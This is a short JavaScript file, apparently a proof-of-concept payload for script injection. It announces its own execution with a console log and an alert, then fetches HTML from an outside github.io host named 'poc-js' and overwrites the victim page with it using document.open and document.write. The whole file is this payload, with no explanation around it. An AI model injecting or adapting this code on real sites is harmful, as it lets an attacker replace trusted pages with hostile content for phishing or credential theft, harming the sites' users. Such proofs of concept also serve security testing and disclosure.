console.log("Y.JS EXECUTED");
alert("Y.JS EXECUTED");
fetch("https://thaysevultus.github.io/poc-js/teste.html")
  .then(r => r.text())
  .then(html => {
    document.open();
    document.write(html);
    document.close();
  });
